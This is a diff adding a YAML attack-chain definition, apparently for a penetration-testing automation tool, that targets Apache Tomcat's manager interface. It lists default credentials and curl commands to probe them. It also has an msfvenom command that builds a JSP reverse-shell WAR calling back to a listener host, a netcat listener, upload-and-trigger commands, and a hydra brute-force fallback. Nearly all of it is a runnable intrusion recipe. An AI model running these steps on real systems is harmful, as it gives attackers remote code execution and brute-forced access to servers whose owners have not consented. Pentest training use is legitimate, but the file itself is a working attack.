@@ -1,0 +1,48 @@
+chain_id: tomcat_manager_default
+title: "Tomcat — /manager/html with default credentials → WAR upload to RCE"
+severity: HIGH
+tags: [tomcat, web, default-creds, rce, war]
+
+trigger:
+  any_of:
+    - { product_pattern: "(?i)tomcat" }
+    - { banner_pattern: "(?i)apache.*tomcat" }
+    - { path_pattern: "(?i)/manager(/html)?$" }
+
+description: |
+  Tomcat's manager app runs at /manager/html and accepts WAR uploads.
+  Common default credentials (`tomcat:tomcat`, `tomcat:s3cret`,
+  `admin:admin`) ship in tutorials and stay forever. Once authenticated,
+  upload a JSP webshell wrapped in a WAR for instant RCE.
+
+steps:
+  - id: 1
+    title: "Probe the manager URL and the default creds"
+    command: |
+      curl -u tomcat:tomcat http://$VICTIMA:8080/manager/html
+      curl -u tomcat:s3cret http://$VICTIMA:8080/manager/html
+      curl -u admin:admin   http://$VICTIMA:8080/manager/html
+
+  - id: 2
+    title: "Build a WAR wrapping a JSP shell (msfvenom)"
+    command: msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 -f war -o shell.war
+
+  - id: 3
+    title: "Listener on Kali"
+    command: nc -lvnp 4444
+
+  - id: 4
+    title: "Upload via the manager API and trigger"
+    command: |
+      curl -u tomcat:tomcat --upload-file shell.war "http://$VICTIMA:8080/manager/text/deploy?path=/shell"
+      curl http://$VICTIMA:8080/shell/
+
+common_errors:
+  - error: "401 Unauthorized on every default cred"
+    solution: |
+      Brute-force with hydra (small list, the `manager-script` realm):
+        hydra -L users.txt -P tomcat-passwords.txt $VICTIMA -s 8080 \
+          http-get '/manager/html:F=401'
+
+references:
+  - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat
